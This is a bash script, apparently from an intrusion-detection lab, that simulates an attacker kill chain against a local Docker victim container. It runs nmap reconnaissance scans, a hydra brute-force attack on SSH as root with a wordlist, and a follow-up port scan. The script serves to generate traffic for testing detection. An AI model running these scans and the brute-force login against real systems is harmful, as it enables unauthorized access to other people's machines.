#!/usr/bin/env bash
# Simulate real attacker behavior: recon -> exploit
# Usage: bash lab/scripts/run_chained_attack.sh

set -euo pipefail

VICTIM_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ids-victim)"

echo "[+] Simulating real attacker kill chain"
echo "========================================"

# Phase 1: Reconnaissance (light scan)
echo "[*] Phase 1: Reconnaissance - light port scan"
docker exec ids-attacker nmap -sS -p 22,80,443,3306 "$VICTIM_IP"
sleep 2

# Phase 2: Detailed scan
echo "[*] Phase 2: Detailed scan of found ports"
docker exec ids-attacker nmap -sV -p 22,80 "$VICTIM_IP"
sleep 2

# Phase 3: Brute force attack
echo "[*] Phase 3: Brute force attack on SSH"
docker exec ids-attacker hydra -l root -P /opt/wordlist.txt -t 4 -f "ssh://${VICTIM_IP}" -e n -I
sleep 2

# Phase 4: Post-exploitation (if successful - simulated)
echo "[*] Phase 4: Simulated lateral movement (internal scan)"
docker exec ids-attacker nmap -sS -p 1-1000 "$VICTIM_IP"

echo "[+] Chain attack complete"
